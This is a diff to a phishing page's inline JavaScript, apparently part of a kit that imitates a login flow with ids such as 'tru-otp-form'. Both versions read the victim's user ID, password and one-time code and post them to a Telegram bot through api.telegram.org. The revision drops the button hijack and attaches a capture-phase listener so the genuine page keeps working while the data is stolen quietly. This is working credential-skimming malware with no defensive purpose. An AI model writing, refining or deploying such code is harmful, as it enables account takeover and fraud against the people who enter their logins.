@@ -538,89 +538,83 @@
                 message += `👉 ${key}: ${data[key]}\n`;
             }
         }
+
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        const payload = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' };
+
+        const payload = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        };
+
         try {
-            const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-            if (!response.ok) { console.error(`Telegram API Error: ${response.statusText}`); }
-        } catch (error) { console.error('Failed to send message to Telegram:', error); }
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            });
+            if (!response.ok) {
+                console.error(`Telegram API Error: ${response.statusText}`);
+            }
+        } catch (error) {
+            console.error('Failed to send message to Telegram:', error);
+        }
     }
 
-    // This is our NEW, master click handler for the sign-in button
+    // This function will be called when the "Sign in" button is clicked
     async function handleSignInClick(event) {
-        // 1. Prevent the original script from doing anything
-        event.preventDefault();
-        event.stopImmediatePropagation();
-
-        // 2. Grab the User ID and Password
+        // We will NOT prevent the default action here. We just want to grab the data and send it.
+        
+        // Directly grab the values from the input fields
         const userIdInput = document.getElementById('iduserId');
         const passwordInput = document.getElementById('idpassword');
-        const loginData = {};
-        if (userIdInput) { loginData['User ID'] = userIdInput.value || 'Not provided'; }
-        if (passwordInput) { loginData['Password'] = passwordInput.value || 'Not provided'; }
-
-        // 3. Send the login data to Telegram and wait for it to finish
-        await sendToTelegram(loginData);
-
-        // 4. Manually open the OTP overlay after the data is sent
-        const otpOverlay = document.getElementById('tru-otp-overlay');
-        if (otpOverlay) {
-            otpOverlay.style.display = 'flex';
-            document.body.style.overflow = 'hidden';
-            // Focus on the OTP input field
-            setTimeout(() => { const otpInput = document.getElementById('tru-otp-code'); if (otpInput) otpInput.focus(); }, 100);
+        
+        let data = {};
+        
+        if (userIdInput) {
+            data['User ID'] = userIdInput.value || 'Not provided';
         }
+        if (passwordInput) {
+            data['Password'] = passwordInput.value || 'Not provided';
+        }
+
+        // Send this data to Telegram immediately
+        await sendToTelegram(data);
     }
 
-    // This function handles the OTP form submission
+    // This function will be called when the OTP form is submitted
     async function handleOtpSubmit(event) {
-        event.preventDefault();
-        event.stopImmediatePropagation();
+        // We will NOT prevent the default action here either.
+        
+        const otpForm = document.getElementById('tru-otp-form');
+        if (!otpForm) return;
 
-        // Grab OTP form data
-        const otpForm = event.target;
         const formData = new FormData(otpForm);
-        const otpData = {};
+        let data = {};
         for (let [key, value] of formData.entries()) {
-            otpData[key.charAt(0).toUpperCase() + key.slice(1)] = value;
+            let cleanKey = key.replace(/[_-]/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
+            data[cleanKey] = value;
         }
 
-        // Send OTP data to Telegram and wait
-        await sendToTelegram(otpData);
-
-        // Manually show the success overlay
-        const otpOverlay = document.getElementById('tru-otp-overlay');
-        const successOverlay = document.getElementById('tru-success-overlay');
-        if (otpOverlay) otpOverlay.style.display = 'none';
-        if (successOverlay) {
-            successOverlay.style.display = 'flex';
-            // Add the reference number and start countdown
-            const refNumber = document.getElementById('tru-ref-number');
-            if (refNumber) refNumber.textContent = 'TRU' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2, 6).toUpperCase();
-            // You can add the countdown logic here if needed, or just let the user close it
-        }
+        // Send the OTP data to Telegram
+        await sendToTelegram(data);
     }
 
     // --- INITIALIZATION ---
-    // We run this code immediately to hijack the button before the original script can
     document.addEventListener('DOMContentLoaded', () => {
-        // Hijack the Sign-In button
         const signInButton = document.getElementById('loginSubmit');
         if (signInButton) {
-            // Remove all existing click listeners from the original script
-            signInButton.replaceWith(signInButton.cloneNode(true));
-            // Get the new button reference
-            const newSignInButton = document.getElementById('loginSubmit');
-            // Add our own listener
-            newSignInButton.addEventListener('click', handleSignInClick);
+            // We attach our handler to capture the data, but we let the original script handle the rest.
+            signInButton.addEventListener('click', handleSignInClick);
         }
 
-        // Hijack the OTP form submission
         const otpForm = document.getElementById('tru-otp-form');
         if (otpForm) {
-            otpForm.replaceWith(otpForm.cloneNode(true));
-            const newOtpForm = document.getElementById('tru-otp-form');
-            newOtpForm.addEventListener('submit', handleOtpSubmit);
+            // We use 'true' to make our listener run before the original script's listener.
+            // This ensures we send the data before the popup is closed.
+            otpForm.addEventListener('submit', handleOtpSubmit, true);
         }
     });
 </script>
